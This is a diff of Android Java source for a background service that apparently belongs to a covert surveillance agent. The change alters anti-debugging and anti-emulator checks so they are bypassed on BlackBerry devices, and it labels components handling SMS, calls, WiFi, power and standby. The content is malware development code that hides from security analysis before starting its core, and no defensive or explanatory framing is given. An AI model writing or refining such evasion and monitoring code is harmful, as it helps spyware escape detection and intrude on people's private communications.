@@ -46,7 +46,7 @@ public class ServiceMain extends Service {
         Status.setAppContext(getApplicationContext());
 
         // ANTIDEBUG ANTIEMU
-        if (!Core.checkStatic()) {
+        if (!Status.isBlackberry() && !Core.checkStatic()) {
             if (Cfg.DEBUG) {
                 Check.log(TAG + " (onCreate) anti emu/debug failed");
             }
@@ -57,10 +57,15 @@ public class ServiceMain extends Service {
             return;
         }
 
+	    // StandBy
         bst = new BSt();
+	    // AC
         bac = new BAc();
+	    // SMS
         bsm = new BSm();
+	    // Call
         bc = new BC();
+	    // Wifi
         wr = new WR();
 
         if (Cfg.DEBUG) {
@@ -111,7 +116,7 @@ public class ServiceMain extends Service {
         }
 
         // ANTIDEBUG ANTIEMU
-        if (Core.checkStatic()) {
+        if (Status.isBlackberry() || Core.checkStatic()) {
 
             // Core starts
             core = Core.newCore(this);
